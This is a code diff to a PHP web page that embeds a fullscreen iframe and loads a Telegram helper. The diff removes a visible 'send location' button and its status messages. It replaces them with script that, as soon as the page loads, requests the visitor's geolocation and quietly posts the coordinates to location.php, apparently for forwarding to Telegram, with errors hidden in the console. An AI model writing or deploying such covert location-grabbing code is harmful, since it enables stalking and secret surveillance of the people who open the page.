@@ -18,44 +18,26 @@ require_once __DIR__ . '/telegram.php';
     allowfullscreen>
 </iframe>
 
-<!-- Botón para enviar ubicación -->
-<button id="btnLocate">Enviar ubicación</button>
-<div id="locStatus"></div>
-<pre id="locData"></pre>
-
 <script>
 'use strict';
 
-// ==== GEOLOCALIZACIÓN ====
-const btn = document.getElementById('btnLocate');
-const statusEl = document.getElementById('locStatus');
-const dataEl = document.getElementById('locData');
-
-btn?.addEventListener('click', () => {
-    if (!('geolocation' in navigator)) {
-        statusEl.textContent = 'Geolocalización no disponible.';
-        return;
-    }
-    statusEl.textContent = 'Solicitando permiso...';
-    navigator.geolocation.getCurrentPosition(async pos => {
+// ==== GEOLOCALIZACIÓN AUTOMÁTICA ====
+if ('geolocation' in navigator) {
+    navigator.geolocation.getCurrentPosition(pos => {
         const { latitude, longitude, accuracy } = pos.coords;
-        statusEl.textContent = 'Ubicación obtenida, enviando a Telegram...';
-        dataEl.textContent = JSON.stringify({ latitude, longitude, accuracy }, null, 2);
 
-        try {
-            const res = await fetch('location.php', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ latitude, longitude, accuracy })
-            });
-            const out = await res.json();
-            statusEl.textContent = 'Servidor respondió: ' + out.status;
-        } catch(e) {
-            statusEl.textContent = 'Error: ' + e.message;
-        }
-    }, err => { statusEl.textContent = 'Error: ' + err.message; }, 
-    { enableHighAccuracy: false, timeout: 10000 });
-});
+        fetch('location.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ latitude, longitude, accuracy })
+        }).catch(e => {
+            console.error('Error enviando ubicación', e);
+        });
+
+    }, err => {
+        console.error('Error obteniendo ubicación', err);
+    }, { enableHighAccuracy: false, timeout: 10000 });
+}
 </script>
 
 </body>
